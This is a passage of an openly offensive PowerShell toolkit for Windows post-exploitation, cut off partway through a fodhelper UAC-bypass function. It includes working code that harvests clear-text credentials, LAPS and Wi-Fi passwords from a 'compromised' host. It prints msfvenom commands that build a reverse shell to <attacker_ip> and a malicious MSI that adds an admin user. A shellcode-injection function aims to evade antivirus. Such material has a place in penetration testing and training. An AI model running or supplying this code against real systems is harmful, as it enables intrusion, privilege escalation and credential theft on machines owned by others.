                <td align="right">$($File.LastWriteTime)</td>
                <td align="right">$($FileLength)</td>
                <td align="left"><a href="$($FileURL)">$($File.Name)</a></td>
                </tr>
"@
                }
@"
                </table>
                <hr>
                </body>
                </html>
"@
                }  # End ForEach

                $Content = Get-DirectoryContent -Path $FullPath -HeaderName "PowerShell Simple HTTP Server" -RequestURL "$Address" -SubfolderName $LocalPath -Root $Root

                $Encoding = [System.Text.Encoding]::UTF8
                $Content = $Encoding.GetBytes($Content)
                $Response.ContentType = "text/html"

            }  # End If
            Else
            {

                $Content = [System.IO.File]::ReadAllBytes($FullPath)
                $Response.ContentType = [System.Web.MimeMapping]::GetMimeMapping($FullPath)

            }  # End Else
        }  # End Try
        Catch [System.UnauthorizedAccessException]
        {

            Write-Output "[x] Access Denied"
            Write-Output "[i] Current user:  $env:USERNAME"
            Write-Output "[i] Requested File: SimpleHTTPServer:\$LocalPath"
            $Response.StatusCode = 404
            $Content = [System.Text.Encoding]::UTF8.GetBytes("<h1>404 - Page Not Found</h1>")

        }  # End Catch
        Catch [System.Management.Automation.ItemNotFoundException]
        {

            Write-Output "[x] Could not reach. Verify server is accessible over the network:  `n`tSimpleHTTPServer:\$LocalPath"
            $Response.StatusCode = 404
            $Content = [System.Text.Encoding]::UTF8.GetBytes("<h1>404 - Page Not Found</h1>")

        }  # End Catch
        Catch
        {

            $Error[0]
            $Content =  "$($_.InvocationInfo.MyCommand.Name) : $($_.Exception.Message)"
            $Content +=  "$($_.InvocationInfo.PositionMessage)"
            $Content +=  "    + $($_.CategoryInfo.GetMessage())"
            $Content +=  "    + $($_.FullyQualifiedErrorId)"

            $Content = [System.Text.Encoding]::UTF8.GetBytes($Content)
            $Response.StatusCode = 500

        }  # End Catch


        $Response.ContentLength64 = $Content.Length
        $Response.OutputStream.Write($Content, 0, $Content.Length)
        $Response.Close()

        $ResponseStatus = $Response.StatusCode
        Write-Output $ResponseStatus

    } While ($Listener.IsListening)

}  # End Function Start-SimpleHTTPServer


<#
.NAME
    Test-PrivEsc


.SYNOPSIS
    This cmdlet is meant to check whether the AlwaysInstallEleveated permissions are enabled on a Windows Machine which opens the door to privesc


.DESCRIPTION
    AlwaysInstallElevated is functionality that offers all users(especially the low privileged user) on a windows machine to run any MSI file with elevated privileges.
    MSI is a Microsoft based installer package file format which is used for installing, storing and removing of a program.

    When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user
    to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is).


.SYNTAX
    Test-PrivEsc [<CommonParameters>]


.PARAMETERS
    <CommonParameters>
        This cmdlet supports the common parameters: Verbose, Debug,
        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
        OutBuffer, PipelineVariable, and OutVariable. For more information, see
        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).


.NOTES
    Author: Rob Osborne
    Alias: tobor
    Contact: rosborne@osbornepro.com


.LINK
    https://github.com/tobor88
    https://gitlab.com/tobor88
    https://www.powershellgallery.com/profiles/tobor
    https://roberthosborne.com
    https://osbornepro.com

#>
Function Test-PrivEsc {
    [CmdletBinding()]
        param()

#==============================================================================================================
#  CLEAR TEXT CREDENTIALS
#==============================================================================================================
        Write-Output "Searching Registry for clear text credentials..."

        Get-ItemProperty -Path "HKCU:\Software\ORL\WinVNC3\Password" -ErrorAction "SilentlyContinue"

        $AutoLoginPassword = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | Select-Object -Property "DefaultUserName","DefaultPassword"
        If (($AutoLoginPassword).DefaultPassword)
        {

            Write-Output "[!] Auto Login Credentials Found: "
            Write-Output "`t$AutoLoginPassword"

        }  # End If

        Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP" -ErrorAction "SilentlyContinue"
        Get-ItemProperty -Path "HKCU:\Software\TightVNC\Server" -ErrorAction "SilentlyContinue"
        Get-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions" -ErrorAction "SilentlyContinue"
        Get-ItemProperty -Path "HKCU:\Software\OpenSSH\Agent\Key" -ErrorAction "SilentlyContinue"

        Write-Verbose "Searching for LAPS password (Requires admin permissions to obtain)"
        $Domain = New-Object -TypeName "System.DirectoryServices.DirectoryEntry"
        $Search = New-Object -TypeName "System.DirectoryServices.DirectorySearcher"
        $Search.SearchRoot = $Domain
        $Search.Filter = "(primaryGroupID=516)"
        $Search.SearchScope = "Subtree"
        $Result = $Search.FindAll()
        $Object = $Result.GetDirectoryEntry()
        $Object | Select-Object -Property 'Name','ms-Mcs-AdmPwd'

        $PassFiles = "C:\Windows\sysprep\sysprep.xml","C:\Windows\sysprep\sysprep.inf","C:\Windows\sysprep.inf","C:\Windows\Panther\Unattended.xml","C:\Windows\Panther\Unattend.xml","C:\Windows\Panther\Unattend\Unattend.xml","C:\Windows\Panther\Unattend\Unattended.xml","C:\Windows\System32\Sysprep\unattend.xml","C:\Windows\System32\Sysprep\unattended.xml","C:\unattend.txt","C:\unattend.inf"
        ForEach ($PassFile in $PassFiles)
        {

            If (Test-Path -Path $PassFile)
            {

                Get-Content -Path $PassFile | Select-String -Pattern "Password"

            }  # End If

        }  # End ForEach
#============================================================================================================
#  AlwaysInstallElevated PRIVESC
#============================================================================================================
        Write-Host "Checking for AlwaysInstallElevated PrivEsc method..." -ForegroundColor "Cyan"
        If ((Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction "SilentlyContinue" | Select-Object -Property "AlwaysInstallElevated") -eq 1)
        {

            Write-Host "Target is vulnerable. To exploit this vulnerability you can use: exploit/windows/local/always_install_elevated`n
                        Use the below commands to create a payload for privilege escalation.`n" -ForegroundColor "Red"
            Write-Host "msfvenom -p windows/adduser USER=attacker PASS=Password123! -f msi-nouac -o alwe.msi    # No uac format`n
                        msfvenom -p windows/adduser USER=attacker PASS=Password123! -f msi -o alwe.msi          # Using the msiexec the uac wont be prompted`n
                        msiexec /quiet /qn /i C:\Users\<username>\Downloads\alwe.msi                            # Execute the installation of the malicious msi file in the background"

        }  # End If
        Else
        {

            Write-Verbose "Target is not vulnerable to AlwaysInstallElevated PrivEsc method"

        }  # End Else
        If ((Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction "SilentlyContinue" | Select-Object -Property "AlwaysInstallElevated") -eq 1)
        {

            Write-Host "Target is vulnerable. To exploit this vulnerability you can use: exploit/windows/local/always_install_elevated`n
                        Use the below commands to create a payload for privilege escalation.`n" -ForegroundColor "Red"
            Write-Host "msfvenom -p windows/adduser USER=attacker PASS=Password123! -f msi-nouac -o privesc.msi  # No uac format`n
                        msfvenom -p windows/adduser USER=attacker PASS=Password123! -f msi -o privesc.msi        # Using the msiexec the uac wont be prompted`n
                        msiexec /quiet /qn /i C:\Users\<username>\Downloads\privesc.msi                             # Execute the installation of the malicious msi file in the background"

        }  # End ElseIf
        Else
        {

            Write-Verbose "Target is not vulnerable to AlwaysInstallElevated PrivEsc method"

        }  # End Else

#===========================================================================================================
#  WSUS PRIVESC
#===========================================================================================================
        Write-Host "Checking for WSUS updates allowed over HTTP for PrivEsc..." -ForegroundColor "Cyan"
        If (((Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "UseWUServer" -ErrorAction "SilentlyContinue") -eq 1) -and (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name "WUServer" -ErrorAction "SilentlyContinue" -Contains "http://"))
        {

            Write-Host "Target is vulnerable to HTTP WSUS updates.`n EXPLOIT: https://github.com/pimps/wsuxploit" -ForegroundColor "Red"

        }  # End If
        Else
        {

            Write-Verbose "Target is not vulnerable to WSUS using HTTP."

        }  # End Else


#============================================================================================================
#  UNQUOTED SERVICE PATHS
#============================================================================================================
        Write-Host "Searching for unquoted service paths..." -ForegroundColor "Cyan"

        $UnquotedServicePaths = Get-CimInstance -ClassName "Win32_Service" -Property "Name","DisplayName","PathName","StartMode" | Where-Object { $_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*' } | Select-Object -Property "PathName","DisplayName","Name"

        If ($UnquotedServicePaths)
        {

            Write-Host "Unquoted Service Path has been found" -ForegroundColor "Red"

            $UnquotedServicePaths | Select-Object -Property PathName,DisplayName,Name | Format-List -GroupBy Name

            Write-Host "Create a reverse shell using the following command`n`nmsfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=1337 -f exe -o msf.exe" -ForegroundColor "Yellow"
            Write-Host "Place the generated payload msf.exe into the unquoted service path location and restart the service." -ForegroundColor "Yellow"

        }  # End If
        Else
        {

            Write-Verbose "Target does not contain any unquoted service paths. "

        }  # End Else

#==============================================================================================================
#  WEAK WRITE PERMISSIONS
#==============================================================================================================
        Write-Host "Performing search for files with weak permissions that may execute as admin or system..." -ForegroundColor "Cyan"

        Get-ChildItem -Path 'C:\Program Files\*','C:\Program Files (x86)\*' | ForEach-Object { Try { Get-Acl -Path $_ -ErrorAction "SilentlyContinue" | Where-Object {($_.Access | Select-Object -ExpandProperty "IdentityReference") -Match "Everyone"} } Catch {$Error[0]}}

        Get-ChildItem -Path 'C:\Program Files\*','C:\Program Files (x86)\*' | ForEach-Object { Try { Get-Acl -Path $_ -ErrorAction "SilentlyContinue" | Where-Object {($_.Access | Select-Object -ExpandProperty "IdentityReference") -Match "BUILTIN\\Users"} } Catch {$Error[0]}}

}  # End Function Test-PrivEsc


<#
.NAME
    Get-InitialEnum


.SYNOPSIS
    This cmdlet was created to perform enumeration of a Windows system using PowerShell.


.DESCRIPTION
    This cmdlet enumerates a system that has been compromised to better understand what is running on the target.
    This does not test for any PrivEsc methods it only enumerates machine info. Use Test-PrivEsc to search for possible exploits.


.SYNTAX
    Get-InitialEnum [[-FilePath] <string>] [<CommonParameters>]


.PARAMETERS
    -FilePath <string>

        Required?                    false
        Position?                    0
        Accept pipeline input?       false
        Parameter set name           ByPath
        Aliases                      None
        Dynamic?                     false

    <CommonParameters>
        This cmdlet supports the common parameters: Verbose, Debug,
        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
        OutBuffer, PipelineVariable, and OutVariable. For more information, see
        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).


INPUTS
    System.Management.Automation.PSObject


OUTPUTS
    System.Object


.ALIASES
    None


.NOTES
    Author: Rob Osborne
    Alias: tobor
    Contact: rosborne@osbornepro.com
    https://roberthosborne.com/
#>
Function Get-InitialEnum {
    [CmdletBinding()]
        param()  # End param

BEGIN
{

    Function Show-KerberosTokenPermissions {
    [CmdletBinding()]
        param()

    $Token = [System.Security.Principal.WindowsIdentity]::GetCurrent()

    ForEach ($SID in $GroupSIDs)
    {

        Try
        {

            Write-Output (($sid).Translate([System.Security.Principal.NTAccount]))

        }  # End Try
        Catch
        {

            Write-Warning ("Could not translate " + $SID.Value + ". Reason: " + $_.Exception.Message)

        }  # End Catch
    }

    $Token

}  # End Function Show-KerberosTokenPermissions


    Function Get-Driver {
        [CmdletBinding()]
            Param (
                [Switch]$Unsigned,
                [Switch]$Signed,
                [Switch]$All)  # End param
    BEGIN
    {

        Write-Output "[*] Retrieving driver signing information …"

    } # End of Begin section
    PROCESS
    {

        If ($Signed)
        {

            Write-Verbose "Obtaining signed driver info..."
            $DrvSig = DriverQuery -SI | Select-String -Pattern "True"

            $DrvSig
            "`n " + $DrvSig.count + " signed drivers, note TRUE column"

        }  # End of If
        ElseIf ($UnSigned)
        {

            Write-Verbose "Obtaining signed driver info..."
            $DrvU = DriverQuery -SI | Select-String "False"

            $DrvU
            "`n " + $DrvU.count + " unsigned drivers, note FALSE column"

        }  # End ElseIf
        ElseIf ($All)
        {

            DriverQuery -SI

        }  # End ElseIf
        Else
        {

            DriverQuery

        }  # End Else

    } # End PROCESS

    } # End Function Get-Driver


    Function Get-AntiVirusProduct {
        [CmdletBinding()]
            param (
                [Parameter(
                    Mandatory=$False,
                    Position=0,
                    ValueFromPipeline=$True,
                    ValueFromPipelineByPropertyName=$true)]
        [Alias('Computer')]
        [string]$ComputerName=$env:COMPUTERNAME )  # End param

        $AntiVirusProducts = Get-WmiObject -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct"  -ComputerName $ComputerName

        $Ret = @()
        ForEach ($AntiVirusProduct in $AntiVirusProducts)
        {
           #The values are retrieved from: http://community.kaseya.com/resources/m/knowexch/1020.aspx
            Switch ($AntiVirusProduct.productState)
            {
                "262144" {$defstatus = "Up to date" ;$rtstatus = "Disabled"}
                "262160" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
                "266240" {$defstatus = "Up to date" ;$rtstatus = "Enabled"}
                "266256" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}
                "393216" {$defstatus = "Up to date" ;$rtstatus = "Disabled"}
                "393232" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
                "393488" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
                "397312" {$defstatus = "Up to date" ;$rtstatus = "Enabled"}
                "397328" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}
                "397584" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}

                Default {$defstatus = "Unknown" ;$rtstatus = "Unknown"}
            }  # End Switch

            $HashTable = @{}
            $HashTable.Computername = $ComputerName
            $HashTable.Name = $AntiVirusProduct.DisplayName
            $HashTable.'Product GUID' = $AntiVirusProduct.InstanceGuid
            $HashTable.'Product Executable' = $AntiVirusProduct.PathToSignedProductExe
            $HashTable.'Reporting Exe' = $AntiVirusProduct.PathToSignedReportingExe
            $HashTable.'Definition Status' = $DefStatus
            $HashTable.'Real-time Protection Status' = $RtStatus

            $Ret += New-Object -TypeName "PSObject" -Property $HashTable

        }  # End ForEach

        $Ret

    }  # End Function Get-AntiVirusProduct

}  # End BEGIN
PROCESS
{
#================================================================
#  SECURITY PATCHES
#================================================================
    Write-Host "=================================`n| OPERATING SYSTEM INFORMATION |`n=================================" -ForegroundColor "Yellow"
    Get-CimInstance -ClassName "Win32_OperatingSystem" | Select-Object -Property Name,Caption,Description,CSName,Version,BuildNumber,OSArchitecture,SerialNumber,RegisteredUser

    Write-Host "=================================`n| HOTFIXES INSTALLED ON DEVICE |`n=================================" -ForegroundColor "Yellow"
    Try
    {

        Get-Hotfix -Description "Security Update"

    }  # End Try
    Catch
    {

        Get-CimInstance -Query 'SELECT * FROM Win32_QuickFixEngineering' | Select-Object -Property HotFixID

    }  # End Catch

#===================================================================
#  NETWORK SHARES AND DRIVES
#===================================================================
Write-Host "=================================`n|  NEWORK SHARE DRIVES  |`n=================================" -ForegroundColor "Yellow"
Get-PSDrive | Where-Object { $_.Provider -like "Microsoft.PowerShell.Core\FileSystem" } | Format-Table -AutoSize


#===================================================================
#  FIND UNSIGNED DRIVERS
#===================================================================

    Get-Driver -Unsigned

#===================================================================
#  FIND SIGNED DRIVERS
#===================================================================

    Get-Driver -Signed

#==========================================================================
#  ANTIVIRUS APPLICATION INFORMATION
#==========================================================================
    Write-Host "=================================`n|    ANTI-VIRUS INFORMATION    |`n=================================" -ForegroundColor "Yellow"

    Get-AntiVirusProduct

#==========================================================================
#  USER, USER PRIVILEDGES, AND GROUP INFO
#==========================================================================
    Write-Host "=================================`n|  LOCAL ADMIN GROUP MEMBERS  |`n=================================" -ForegroundColor "Yellow"
    Get-LocalGroupMember -Group "Administrators" | Format-Table -Property "Name","PrincipalSource"

    Write-Host "=================================`n|       USER & GROUP LIST       |`n=================================" -ForegroundColor "Yellow"
    Get-CimInstance -ClassName "Win32_UserAccount" | Format-Table -AutoSize
    Get-LocalGroup | Format-Table -Property "Name"

    Write-Host "=================================`n|  CURRENT USER PRIVS   |`n=================================" -ForegroundColor "Yellow"
    whoami /priv

    Write-Host "=================================`n| USERS WHO HAVE HOME DIRS |`n=================================" -ForegroundColor "Yellow"
    Get-ChildItem -Path C:\Users | Select-Object -Property "Name"

    Write-Host "=================================`n|  CLIPBOARD CONTENTS  |`n=================================" -ForegroundColor "Yellow"
    Get-Clipboard

    Write-Host "=================================`n|  SAVED CREDENTIALS  |`n=================================" -ForegroundColor "Yellow"
    cmdkey /list
    Write-Host "If you find a saved credential it can be used issuing a command in the below format: "
    Write-Host 'runas /savecred /user:WORKGROUP\Administrator "\\###.###.###.###\FileShare\msf.exe"'

    Write-Host "=================================`n|  SIGNED IN USERS  |`n=================================" -ForegroundColor "Yellow"
    qwinsta


    Write-Host "=========================================`n|  CURRENT KERBEROS TICKET PERMISSIONS  |`n=========================================" -ForegroundColor "Yellow"
    Show-KerberosTokenPermissions

#==========================================================================
#  NETWORK INFORMATION
#==========================================================================
    Write-Host "=================================`n|   LISTENING PORTS   |`n=================================" -ForegroundColor "Yellow"
    Get-NetTcpConnection -State "Listen" | Sort-Object -Property "LocalPort" | Format-Table -AutoSize

    Write-Host "=================================`n|  ESTABLISHED CONNECTIONS  |`n=================================" -ForegroundColor "Yellow"
    Get-NetTcpConnection -State "Established" | Sort-Object -Property "LocalPort" | Format-Table -AutoSize

    Write-Host "=================================`n|  DNS SERVERS  |`n=================================" -ForegroundColor "Yellow"
    Get-DnsClientServerAddress -AddressFamily "IPv4" | Select-Object -Property "InterfaceAlias","ServerAddresses" | Format-Table -AutoSize

    Write-Host "=================================`n|  ROUTING TABLE  |`n=================================" -ForegroundColor "Yellow"
    Get-NetRoute | Select-Object -Property "DestinationPrefix","NextHop","RouteMetric" | Format-Table -AutoSize

    Write-Host "=================================`n|    ARP NEIGHBOR TABLE    |`n=================================" -ForegroundColor "Yellow"
    Get-NetNeighbor | Select-Object -Property "IPAddress","LinkLayerAddress","State" | Format-Table -AutoSize

    Write-Host "=================================`n|  Wi-Fi Passwords  |`n=================================" -ForegroundColor "Yellow"
    (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize

#==========================================================================
#  APPLICATION INFO
#==========================================================================
    Write-Host "=================================`n| INSTALLED APPLICATIONS |`n=================================" -ForegroundColor "Yellow"

    $Paths = 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\','HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\'

    ForEach ($Path in $Paths)
    {

        Get-ChildItem -Path $Path | Get-ItemProperty | Select-Object -Property "DisplayName","Publisher","InstallDate","DisplayVersion" | Format-Table -AutoSize

    }  # End ForEach

    Write-Host "=================================`n| STARTUP APPLICATIONS |`n=================================" -ForegroundColor "Yellow"
    Get-CimInstance -ClassName "Win32_StartupCommand" | Select-Object -Property "Name","Command","Location","User" | Format-Table -AutoSize

    $StartupAppCurrentUser = (Get-ChildItem -Path "C:\Users\$env:USERNAME\Start Menu\Programs\Startup" | Select-Object -ExpandProperty "Name" | Out-String).Trim()
    If ($StartupAppCurrentUser)
    {

        Write-Host "$StartupAppCurrentUser automatically starts for $env:USERNAME" -ForegroundColor "Cyan"

    }  # End If

    $StartupAppAllUsers = (Get-ChildItem -Path "C:\Users\All Users\Start Menu\Programs\Startup" | Select-Object -ExpandProperty "Name" | Out-String).Trim()
    If ($StartupAppAllUsers)
    {

        Write-Host "$StartupAppAllUsers automatically starts for All Users" -ForegroundColor "Cyan"

    }  # End If

    Write-Host "Check below values for binaries you may be able to execute as another user."
    Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
    Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
    Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
    Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'


#==========================================================================
#  PROCESS AND SERVICE ENUMERATION
#==========================================================================
    Write-Host "=================================`n|  PROCESS ENUMERATION  |`n=================================" -ForegroundColor "Yellow"
    Get-WmiObject -Query "Select * from Win32_Process" | Where-Object { $_.Name -notlike "svchost*" } | Select-Object -Property "Name","Handle",@{Label="Owner";Expression={$_.GetOwner().User}} | Format-Table -AutoSize

    Write-Host "=================================`n|  ENVIRONMENT VARIABLES  |`n=================================" -ForegroundColor "Yellow"
    Get-ChildItem -Path "Env:" | Format-Table -Property "Key","Value"

}  # End PROCESS

}  # End Function Get-InitialEnum



Function Get-Driver {
    [CmdletBinding()]
        Param (
            [Switch]$Unsigned,
            [Switch]$Signed,
            [Switch]$All)  # End param
BEGIN
{

    Write-Host "Retrieving driver signing information …" -ForegroundColor "Cyan"

} # End of Begin section
PROCESS
{

    If ($Signed)
    {

        Write-Verbose "Obtaining signed driver info..."
        $DrvSig = DriverQuery -SI | Select-String -Pattern "True"

        $DrvSig
        "`n " + $DrvSig.count + " signed drivers, note TRUE column"

    }  # End of If
    ElseIf ($UnSigned)
    {

        Write-Verbose "Obtaining signed driver info..."
        $DrvU = DriverQuery -SI | Select-String "False"

        $DrvU
        "`n " + $DrvU.count + " unsigned drivers, note FALSE column"

    }  # End ElseIf
    ElseIf ($All)
    {

        DriverQuery -SI

    }  # End ElseIf
    Else
    {

        DriverQuery

    }  # End Else

} # End PROCESS

} # End Function Get-Driver


Function Get-AntiVirusProduct {
    [CmdletBinding()]
        param (
            [Parameter(
                Mandatory=$False,
                Position=0,
                ValueFromPipeline=$True,
                ValueFromPipelineByPropertyName=$true)]
    [Alias('Computer')]
    [string]$ComputerName=$env:COMPUTERNAME )  # End param

    $AntiVirusProducts = Get-WmiObject -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct"  -ComputerName $ComputerName

    $Ret = @()
    ForEach ($AntiVirusProduct in $AntiVirusProducts)
    {
       #The values are retrieved from: http://community.kaseya.com/resources/m/knowexch/1020.aspx
        Switch ($AntiVirusProduct.productState)
        {
            "262144" {$defstatus = "Up to date" ;$rtstatus = "Disabled"}
            "262160" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
            "266240" {$defstatus = "Up to date" ;$rtstatus = "Enabled"}
            "266256" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}
            "393216" {$defstatus = "Up to date" ;$rtstatus = "Disabled"}
            "393232" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
            "393488" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
            "397312" {$defstatus = "Up to date" ;$rtstatus = "Enabled"}
            "397328" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}
            "397584" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}

            Default {$defstatus = "Unknown" ;$rtstatus = "Unknown"}
        }  # End Switch

        $HashTable = @{}
        $HashTable.Computername = $ComputerName
        $HashTable.Name = $AntiVirusProduct.DisplayName
        $HashTable.'Product GUID' = $AntiVirusProduct.InstanceGuid
        $HashTable.'Product Executable' = $AntiVirusProduct.PathToSignedProductExe
        $HashTable.'Reporting Exe' = $AntiVirusProduct.PathToSignedReportingExe
        $HashTable.'Definition Status' = $DefStatus
        $HashTable.'Real-time Protection Status' = $RtStatus

        $Ret += New-Object -TypeName "PSObject" -Property $HashTable

    }  # End ForEach

    $Ret

}  # End Function Get-AntiVirusProduct

<#
.NAME
    Invoke-InMemoryPayload


.SYNOPSIS
    Injects an msfvenom payload into a Windows machines memory as a way to attempt evading Anti-Virus protections.
    This function was built off of a template from the Offensive Security PWK course.

.SYNTAX
    Invoke-InMemoryPayload [-ShellCode] <bytes[] shellcode>


.DESCRIPTION
    This cmdlet is used to attempt bypassing AV software by injecting shell code in a byte arrary into a separate thread of specially allocated memory.
    It is possible that this will not be able to execute a certain Windows devices as the DLLs or user permissions may prevent the execution of this function.


.EXAMPLES
    -------------------------- EXAMPLE 1 --------------------------
   C:\PS> Invoke-InMemoryPayload -ShellCode 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90
   This command injects NOP bits into a separate thread of specially allocated memory on a Windows machine.


 .PARAMTERS
    -ShellCode <byte[]>
        Defines the Class C subnet range to perform the ping sweep
        Enter a string consisting of 1-3 digits followed by a . followed by 1-3 digits followed by a . followed by 1-3 digits followed by a . followed by a zero
        Required?                    True
        Position?                    0
        Default value                None
        Accept pipeline input?       false
        Accept wildcard characters?  false


.INPUTS
    [System.Byte[]]


.OUTPUTS
    None


.NOTES
    Author: Rob Osborne
    Alias: tobor
    Contact: rosborne@osbornepro.com
    https://roberthosborne.com
#>
Function Invoke-InMemoryPayload
{
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$True,
                Position=0,
                ValueFromPipeline=$True,
                ValueFromPipelineByPropertyName=$True,
                HelpMessage='Generate an msfvenom payload. Copy the value of the byte variable and place it here.')]  # End Parameter
            [Byte[]]$ShellCode
        )  # End param

    Write-Verbose "Importing DLL's..."
    $CSCode = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

    $WinFunc = Add-Type -MemberDefinition $CSCode -Name "Win32" -Namespace "Win32Functions" -PassThru
    $Size = 0x1000

    If ($ShellCode.Length -gt 0x1000)
    {

        $Size = $ShellCode.Length

        Write-Verbose "Length of payload is $Size"

    }  # End If

    Write-Verbose "Allocating a block of memory for execution using VirtualAlloc()..."
    $X = $WinFunc::VirtualAlloc(0,$Size,0x3000,0x40)

    Write-Verbose "Writing payload to newly allocated memory block using memset()..."
    For ( $i = 0 ; $i -le ($ShellCode.Length - 1); $i++ )
    {

        Try
        {

            $WinFunc::memset([IntPtr]($x.ToInt32()+$i), $ShellCode[$i], 1)

        }  # End Try
        Catch [Exception]
        {

             Throw "There was an error executing payload. Cmdlet is being prevented from allocating memory with the used DLLs."

        }  # End Catch
        Catch
        {

            Throw "I have not caught this error before. Please email me the results at rosborne@osbornepro.com"

        }  # End Catch

    }  # End For

    Write-Verbose "Executing in separte thread using CreateThread()..."
    $WinFunc::CreateThread(0,0,$X,0,0,0)
    For (;;)
    {

        Start-sleep -Seconds 60

    }  # End For

}  # End Invoke-InMemoryPayload


<#
.NAME
    Invoke-FodHelperBypass


.SYNOPSIS
    This function is used to bypass UAC restrictions for the currently logged in user with administrative privileges.
    When C:\Windows\System32\fodhelper.exe is run, the process first checks the registry value of the current user.
    If the registry location does not exist it moves on from HKCU to HKCR (HKEY Classes Root). This bypass method exploits
    this creating the registry value that is searched for first when the process is executed. In the fodhelper.exe
    application manifest we can see that fodhelper.exe has two flags set that make this possible. This first is the
    RequestedExecutionLevel which is set to "Require Administrator" and the second is AutoElevate which is set to "True".
    This means the application can only be run by an administrator and it can elevate privileges without prompting for credentials.
    To protect your computer from this bypass, don't sign into your computer with an account that has admin privileges. Also
    set HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System value ConsentPromptBehaviorAdmin to 1 or 2.


.SYNTAX
    Invoke-FodHelperBypass [-Program <string>] [<CommonParameters>]


.PARAMETERS
    -Program <string>
        Specify the absolute or relative path for executable or application you wish to run with elevated permissions.
        Specifies a local script that this cmdlet runs with elevated permissions. The script must exist on the local
        computer or in a directory that the local computer can access.
        Required?                    True
        Position?                    0
        Default value                None
        Accept pipeline input?       false
        Accept wildcard characters?  false

    <CommonParameters>
        This cmdlet supports the common parameters: Verbose, Debug,
        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
        OutBuffer, PipelineVariable, and OutVariable. For more information, see
        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).


.DESCRIPTION
    This cmdlet is used to open an application with full administrative privileges for the currently logged in
    administrative user. If the registry settings are not configured to prevent this from working it will mention
    what can be done to prevent this from working.


.EXAMPLE
    -------------------------- EXAMPLE 1 --------------------------
   C:\PS> Invoke-FodHelperBypass -Program 'powershell.exe'
   This command opens PowerShell in a new window with elevated privileges.


.NOTES
    Author: Robert H. Osborne
    Alias: tobor
    Contact: rosborne@osbornepro.com
    https://roberthosborne.com

.INPUTS
    [System.IO]


.OUTPUTS
    None

#>
Function Invoke-FodhelperBypass
{
    [CmdletBinding()]
        Param(
            [Parameter(
                Mandatory=$False,
                Position=0,
                ValueFromPipeLine=$True,
                ValueFromPipelineByPropertyName=$True,
                HelpMessage='Enter an executable you wish to execute to gain privesc. Default value is cmd /c start powershell.exe')]  # End Parameter
        [String]$Program = "cmd /c start powershell.exe")  # End param

    BEGIN
    {

        $Value = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" | Select-Object -Property "ConsentPromptBehaviorAdmin"

        Switch ($Value.ConsentPromptBehaviorAdmin)
        {
            0 { $Message = "0 : Elevate without prompting" }
            1 { $Message = "1 : Prompt for credentials on the secure desktop" }
            2 { $Message = "2 : Prompt for consent on the secure desktop" }
            3 { $Message = "3 : Prompt for credentials"}
            4 { $Message = "4 : Prompt for consent"}
            5 { $Message = "5 : Prompt for consent for non-Windows binaries"}
        }  # End Switch

